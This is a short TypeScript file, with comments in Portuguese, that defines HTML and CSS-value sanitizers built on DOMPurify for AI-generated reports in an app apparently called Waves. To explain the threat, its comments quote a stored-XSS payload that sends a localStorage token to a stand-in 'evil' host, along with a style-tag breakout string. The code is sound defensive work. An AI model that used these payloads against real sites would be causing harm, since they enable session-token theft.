import DOMPurify from "dompurify";

/**
 * Sanitiza HTML não confiável antes de injetar via `dangerouslySetInnerHTML`.
 *
 * Por quê: relatórios e snippets de busca chegam montados pela IA / pelo gateway
 * a partir de dados que o usuário preenche na Waves (nomes de tarefas, comentários,
 * conteúdo de mensagens). Sem limpeza, um payload como
 * `<img src=x onerror="fetch('https://evil/'+localStorage.token)">` gravado num
 * campo executaria no navegador de quem abrisse o relatório (stored XSS).
 *
 * DOMPurify mantém a formatação legítima (tabelas, títulos, negrito, listas,
 * `style` inline dos relatórios) e remove `<script>`, handlers `on*`,
 * `javascript:` e afins. Único ponto onde HTML cru entra no DOM — centralizado
 * aqui (DRY): todo `dangerouslySetInnerHTML` de conteúdo dinâmico passa por isto.
 */
export function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
}

/**
 * Sanitiza um valor que vai ser interpolado dentro de um bloco CSS (`<style>`).
 * DOMPurify não cobre conteúdo de CSS; aqui barramos os caracteres que permitiriam
 * escapar da declaração (`< > { } ; "` `'`) — ex.: uma cor vinda do openui-lang
 * valendo `red}</style><script>…`. Mantém letras, números, `#`, `(`/`)`, `,`,
 * `%`, `.`, espaço e `-` (suficiente para hex, rgb()/hsl(), nomes de cor e vars).
 */
export function safeCssValue(value: string): string {
  return String(value ?? "").replace(/[^a-zA-Z0-9#(),.%\s-]/g, "");
}
